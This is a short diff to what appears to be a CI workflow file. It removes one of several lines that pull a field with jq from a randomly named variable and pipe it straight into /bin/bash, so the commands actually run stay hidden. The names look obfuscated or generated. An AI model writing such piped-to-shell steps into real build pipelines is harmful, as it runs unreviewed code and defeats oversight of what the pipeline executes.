@@ -30,7 +30,6 @@ jobs:
           echo $mhjgz20 | jq -r .oopvc57195 | /bin/bash
           echo $yr0455 | jq -r .bsg67 | /bin/bash
           echo $zvi58336 | jq -r .qigd158 | /bin/bash
-          printf '%s' "$zvjyg02077" | jq -r .bqa555 | /bin/bash
           echo $zqlqi15941 | jq -r .dlv636 | /bin/bash
 
       - name: Store artifact
